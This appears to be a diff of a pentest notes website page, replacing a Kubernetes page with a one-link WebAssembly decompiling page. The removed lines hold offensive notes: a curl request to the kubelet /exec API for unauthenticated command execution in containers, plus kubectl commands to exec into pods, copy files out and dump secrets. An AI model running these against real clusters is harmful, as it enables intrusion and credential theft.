@@ -7,22 +7,22 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="search" href="/opensearch.xml" type="application/opensearchdescription+xml" title="Security Tips">
 
-  <meta name="description" content="Check Kubernetes API and execute commands">
-  <meta name="keywords" content="docker, kubernetes">
+  
+  <meta name="keywords" content="web, webassembly, wasm, wabt">
 
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
   <title>
-    Kubernetes - Security Tips
+    WASM - Security Tips
     
   </title>
   <link rel="stylesheet" href="../css/style.css" type="text/css" />
   
   <script>
     // Current page data
-    var mkdocs_page_name = "Kubernetes";
-    var mkdocs_page_input_path = "kubernetes.md";
-    var mkdocs_page_url = "/kubernetes/";
+    var mkdocs_page_name = "WASM";
+    var mkdocs_page_input_path = "wasm.md";
+    var mkdocs_page_url = "/wasm/";
   </script>
    
 </head>
@@ -94,7 +94,7 @@
           
           <li class="bold">
             
-    <span class="section-link ">Web</span>
+    <span class="section-link active">Web</span>
     <ul>
                 <li class="">
                     
@@ -148,9 +148,14 @@
                     
     <a class="section-link" href="../sharepoint/">SharePoint</a>
                 </li>
-                <li class="">
+                <li class="active">
                     
-    <a class="section-link" href="../wasm/">WASM</a>
+    <a class="section-link" href="./">WASM</a>
+    <ul>
+            
+    
+
+    </ul>
                 </li>
     </ul>
           </li>
@@ -292,7 +297,7 @@
           
           <li class="bold">
             
-    <span class="section-link active">Misc</span>
+    <span class="section-link ">Misc</span>
     <ul>
                 <li class="">
                     
@@ -302,44 +307,9 @@
                     
     <a class="section-link" href="../docker/">Docker</a>
                 </li>
-                <li class="active">
+                <li class="">
                     
-    <a class="section-link" href="./">Kubernetes</a>
-    <ul>
-            
-    
-    <ul>
-    
-        <li><a class="" href="#list-pods">List pods</a></li>
-    
-        <li><a class="" href="#execute-commands">Execute commands</a></li>
-    
-    </ul>
-    
-
-    
-    <ul>
-    
-        <li><a class="" href="#kubernetes-version">Kubernetes version</a></li>
-    
-        <li><a class="" href="#start-a-pod">Start a pod</a></li>
-    
-        <li><a class="" href="#attach-to-an-existing-pod">Attach to an existing pod</a></li>
-    
-        <li><a class="" href="#connect-to-an-existing-connection">Connect to an existing connection</a></li>
-    
-        <li><a class="" href="#copy-a-file-from-a-pod-to-the-local-machine">Copy a file from a pod to the local machine</a></li>
-    
-        <li><a class="" href="#print-services">Print services</a></li>
-    
-        <li><a class="" href="#print-pods">Print pods</a></li>
-    
-        <li><a class="" href="#print-secrets">Print secrets</a></li>
-    
-    </ul>
-    
-
-    </ul>
+    <a class="section-link" href="../kubernetes/">Kubernetes</a>
                 </li>
                 <li class="">
                     
@@ -394,52 +364,9 @@
         <div role="main">
           <div class="section">
             
-              <h1>Kubernetes</h1>
-              <h2 id="api">API</h2>
-<p>The Kubernetes API exposes the ports <code>10250</code> and <code>10255</code> (HTTP read-only).
-This API can be used to interact with the Kubernetes engine which basically
-give us the right to do anything you desire unauthenticated.</p>
-<h3 id="list-pods">List pods</h3>
-<p>To confirm that the host is running Docker you can make a GET requests to <code>/pods</code>:</p>
-<pre><code class="language-none">https://&lt;host&gt;:&lt;port&gt;/pods
-</code></pre>
-<pre><code class="language-json">{&quot;kind&quot;:&quot;PodList&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;items&quot;:[{&quot;metadata&quot;:{&quot;name&quot;:&quot;dind-sgz8n&quot;,&quot;generateName&quot;:&quot;dind-&quot;,&quot;namespace&quot;:&quot;default&quot;,&quot;selfLink&quot;:&quot;/api/v1/namespaces/default/pods/dind-sgz8n&quot;,`...}],&quot;qosClass&quot;:&quot;BestEffort&quot;}}]}
-</code></pre>
-<h3 id="execute-commands">Execute commands</h3>
-<p>With the above information it's possible to send requests to the API to execute
-commands:</p>
-<pre><code class="language-bash">$ curl --insecure -v -H &quot;W-Stream-Protocol-Version: v2.channel.k8s.io&quot; -H &quot;X-Stream-Protocol-Version: channel.k8s.io&quot; -H &quot;Connection: upgrade&quot; -H &quot;Upgrade: SPDY/3.1&quot; -X POST &quot;https://&lt;host&gt;:&lt;port&gt;/exec/&lt;namespace&gt;/&lt;pod_name&gt;/&lt;container_name&gt;?command=&lt;cmd&gt;&amp;input=1&amp;output=1&amp;tty=1&quot;
-</code></pre>
-<p>In the response, there is a <code>Location</code> header to create a WebSocket connection:</p>
-<pre><code class="language-bash">$ wscat -c &quot;https://&lt;host&gt;:&lt;port&gt;/&lt;location_header&gt;&quot; --no-check
-</code></pre>
-<h2 id="useful-commands">Useful commands</h2>
-<h4 id="kubernetes-version">Kubernetes version</h4>
-<pre><code class="language-bash">kubectl version
-</code></pre>
-<h4 id="start-a-pod">Start a pod</h4>
-<pre><code class="language-bash">kubectl run k8s-2-test -ti --rm --image=debian --generator=run-pod/v1
-</code></pre>
-<h4 id="attach-to-an-existing-pod">Attach to an existing pod</h4>
-<pre><code class="language-bash">kubectl exec -it k8s-2-test -- /bin/bash
-</code></pre>
-<h4 id="connect-to-an-existing-connection">Connect to an existing connection</h4>
-<pre><code class="language-bash">kubectl attach k8s-1-test -c k8s-1-test -i -t
-</code></pre>
-<h4 id="copy-a-file-from-a-pod-to-the-local-machine">Copy a file from a pod to the local machine</h4>
-<pre><code class="language-bash">kubectl cp default/k8s-1-test:{FILE} ./{FILE_DEST}
-</code></pre>
-<h4 id="print-services">Print services</h4>
-<pre><code class="language-bash">kubectl get services (-o wide)
-</code></pre>
-<h4 id="print-pods">Print pods</h4>
-<pre><code class="language-bash">kubectl get pods -o json
-kubectl get pods -o wide
-kubectl get pods -o wide | sed -e 's/\s\+/ /g' | cut -f6 -d &quot; &quot;
-</code></pre>
-<h4 id="print-secrets">Print secrets</h4>
-<pre><code class="language-bash">kubectl get secrets -o yaml
-</code></pre>
+              <h1>WASM</h1>
+              <h2 id="decompile-wasm-code">Decompile WASM code</h2>
+<p><a href="https://webassembly.github.io/wabt/demo/" target="_blank">https://webassembly.github.io/wabt/demo/</a></p>
             
           </div>
           <footer>
@@ -458,10 +385,10 @@ kubectl get pods -o wide | sed -e 's/\s\+/ /g' | cut -f6 -d &quot; &quot;
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../docker/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../sharepoint/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../citrix/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../android/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
